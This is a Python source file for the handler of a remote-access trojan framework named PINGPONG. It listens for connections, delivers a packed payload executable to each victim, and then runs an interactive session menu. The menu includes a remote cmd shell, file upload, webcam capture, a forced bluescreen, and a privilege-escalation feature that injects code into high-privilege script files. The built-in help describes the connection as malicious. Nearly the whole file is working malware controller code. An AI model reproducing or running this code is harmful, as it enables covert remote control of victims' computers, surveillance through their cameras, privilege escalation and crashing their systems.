# -*- coding:utf-8 -*-
# @FileName  :handler.py
# @Time      :2022/11/07 21:23:35
# @Author    :D0WE1L1N
import random
import socket
# import threading
import sys
import main, config_set
import threading
import ctypes
import os
import inspect
import payload.payload_packer
def _async_raise(tid, exctype):
  """raises the exception, performs cleanup if needed"""
  tid = ctypes.c_long(tid)
  if not inspect.isclass(exctype):
    exctype = type(exctype)
  res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
  if res == 0:
    raise ValueError("invalid thread id")
  elif res != 1:
    # """if it returns a number greater than one, you're in trouble,
    # and you should call it again with exc=NULL to revert the effect"""
    ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
    raise SystemError("PyThreadState_SetAsyncExc failed")
def stop_thread(thread):
  _async_raise(thread.ident, SystemExit)
#开启监听
#函数中printf参数决定时候进行不必要的输出
def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True):
    global g_is_auto, connect_pool, t
    connect_pool = main.get_value('connect_pool')
    if connect_pool == None:
        connect_pool = []
        main.set_config('connect_pool', connect_pool)
    g_is_auto = is_auto
    config_list = ["listen_Default_ip", "listen_Default_port", "Autocommand"]
    handler_d = main.get_value('handler')
    load_config(config_list, handler_d)
    if is_input:
        ip = input(f"handler>[*]Please input the IP for the attack machine(blank for {listen_Default_ip})>")
        main.back_to_main(ip)
        port = input(f"handler>[*]Please input the PORT(blank for {listen_Default_port})>")
        main.back_to_main(port)
    if port == "":
        port = listen_Default_port
    if ip == "":
        ip = listen_Default_ip
    try:
        port = int(port)
    except:
        main.print_error("handler>[-]port input error")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((ip, port))
            s.listen(10)
        except socket.error as msg:
            main.print_error(f"handler>[-]{msg}")
            main.print_error("handler>[-]Failed to bind on " + ip + ":" + str(port))
            main.print_normal(f"handler>[*]Bind on {listen_Default_ip}:{listen_Default_port}")
            startserver(True, listen_Default_ip, listen_Default_port)
    except socket.error as msg:
        main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    if printf:
        main.print_normal('handler>[*]Starting handler at ' + ip + ":" + str(port))
    while True:
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            main.print_normal("handler>[*]Stoping......")
            main.main()
        _basic_ip = addr[0]
        conn.send(b'OK')
        len_id = conn.recv(1024).decode('utf8')
        conn.send(b'OK')
        payload_id = conn.recv(int(len_id)).decode('utf8')
        _payload_id_with_exe = payload_id + '.exe'
        if os.path.isfile(f'./payload/upload_payload/{_payload_id_with_exe}'):
            conn.send(b'OK')
            with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
                se_data = f.read()
                main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
                conn.send(bytes(str(len(se_data)), 'utf8'))
                conn.recv(1024)
                conn.send(se_data)
                conn.close()
                s.close()
                break
        else:
            conn.send(b'wait')
            main.print_error('handler>[-]The payload is missing!')
            main.print_normal('handler>[*]Makeing it again, using the current settings......')
            upx_dir = input("handler>[*]Please input the upx_dir>")
            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_ask=False, is_ask_ip=ip, is_ask_port=port, is_basic_payload=True, _payload_id=payload_id, is_return_main=False)
            conn.send(b'OK')
            with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
                se_data = f.read()
                main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
                conn.send(bytes(str(len(se_data)), 'utf8'))
                conn.recv(1024)
                conn.send(se_data)
                conn.close()
                s.close()
                break
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(5)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(10)
    while True:
        conn, addr = s.accept()
        _ip = addr[0]
        _port = addr[1]
        connect_pool.append([conn, ip, port, _ip, _port, 'PINGPONG session'])
        id = len(connect_pool)
        # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
        if printf:
            main.print_normal(f'handler>[*]PINGPONG session {id} Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
        # t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
        # t.start()
        main.set_config('connect_pool', connect_pool)
        
        t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, Autocommand))
        t.start()
#连接程序
def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
    #请求发送函数：检查连接
    # session_pool = main.get_value('connect_pool')
    # my_id = session_pool.index([conn, my_ip, my_port, ip, port, 'PINGPONG session']) + 1
    all_usage = ['cmd', 'upload', 'cam_shot', 'priv_vbp_listen', 'background', 'bluescreen']
    import PINGPONG_script.addsend
    def show_out_usage(list=False, print_out=False):
        glo = globals()
        if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
            conn.send(b'OK')
            amount_of_usage = conn.recv(1024)
            conn.send(b'OK')
            i = 0
            usage_list = []
            while i < int(amount_of_usage.decode('utf8')):
                usage = conn.recv(1024)
                usage_list.append(usage.decode('utf8'))
                conn.send(b'OK')
                i += 1
            if print_out:
                if list:
                    main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
                else:
                    main.print_normal(''' 
    ---------------------PINGPONG usage---------------------
    ''')
            id_count = 0
            usage_list.append('background')
            usage_id_dst = {}
            for _usage in all_usage:
                if _usage in usage_list:
                    id_count += 1
                    usage_id_dst[_usage] = str(id_count)
                    if print_out:
                        main.print_good(f'  {id_count}) {_usage}')
                else:
                    usage_id_dst[_usage] = None
            if print_out:
                main.print_good('   66) help')
                main.print_good('   99) exit')
            glo['usage_id_dict'] = usage_id_dst
    while True:
        if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
            main.print_normal("PINGPONG>[*]running " + Autocommand)
            command = Autocommand
            Autocommand = False
        else:
            show_out_usage()
            command = input("PINGPONG>")
        #主循环
        # if is_Auto:
        #     command = input("PINGPONG>")
        # else:
        #     print("PINGPONG>[*]running " + AUTOCOMMAND)
        #     command = AUTOCOMMAND
        #     is_Auto = True
        if command == 'help' or command == 'HELP' or command == '66':
            main.print_normal("""
PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
    usage:
        the usage of the shell is set when you generate the payload
        a PINGPONG payload must have those usage:
            exit : exit the connection
            help : for help
            show_usage : print out the usage(s) the payload has
            PING : check the connection. If it is good, return PONG
            info : printout the ip and port of both the hosts
            bg : background the PINGPONG session
        the below usage will be activate if u set it when u are generating the payload
        if u have this usage, type command to use it:
            cmd : make a cmd connection
            upload : upload your file
            cam_shot : take shot
            priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
        elif command == 'backdoor_exe' or command == 'BACKDOOR_EXE':
            pass
        elif command == 'bg' or command == 'BG' or command == usage_id_dict['background']:
            main.print_normal('PINGPONG[*]>backgrounding session......')
            if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
                main.main()
        elif command == "cam_shot" or command == "CAM_SHOT" or command == usage_id_dict['cam_shot']:
            import PINGPONG_script.camera
            if PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn):
                try:
                    import cv2      
                    img = cv2.imread('shot.jpg',1)
                    cv2.imshow('imshow',img)
                    cv2.waitKey(0)
                    cv2.destroyAllWindows()
                except:
                    print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
        elif command == "exit" or command == "EXIT" or command == '99':
            conn.send(bytes("EXIT_APP", 'utf8'))
            main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
            main.print_normal("handler>[*]Back to main console......")
            connect_pool = main.get_value('connect_pool')
            connect_pool.remove([conn, my_ip, my_port, ip, int(port),'PINGPONG session'])
            main.set_config('connect_pool', connect_pool)
            conn.close()
            main.main()
            stop_thread(t)
        elif command == " " or command == "":
            continue
        elif command == 'bluescreen' or command == 'BLUESCREEN' or command == usage_id_dict['bluescreen']:
            import PINGPONG_script.bluescreen
            PINGPONG_script.bluescreen.start_attack(conn, my_ip, my_port, ip, port)
        elif command == "priv_vbp_listen" or command == "PRIV_VBP_LISTEN" or command == usage_id_dict['priv_vbp_listen']:
            import PINGPONG_script.priv_vbp_listen
            if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
                conn.close()
                startserver(False, False, ip=ip, port=port)
        elif command == 'show_usage' or command == 'SHOW_USAGE':
            show_out_usage(list=False, print_out=True)
        elif command == "cmd" or command == "CMD" or command == usage_id_dict['cmd']:
            import PINGPONG_script.cmdshell
            if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
                main.print_good("PINGPONG>[+]GOT IT")
                cmd_port = random.randint(5000, 8000)
                conn.send(bytes(str(cmd_port), "utf8"))
                conn.recv(1024)
                PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port, _main_port=port)
        elif command == "upload" or command == "UPLOAD" or command == usage_id_dict['upload']:
            import PINGPONG_script.upload
            if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
                file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
                to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
        elif command == "info" or command == "INFO":
            main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
        elif command == "ping" or command == "PING":
            if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
                main.print_normal("PINGPONG>[*]PONG")
        else:
            main.print_error("PINGPONG>[-]Command " + command + " not found")                 
def load_config(config_list, d):
    local_var = globals()
    for con in config_list:
        data = d[con]
        local_var[f'{con}'] = data
        # print(f'{con} : {data}')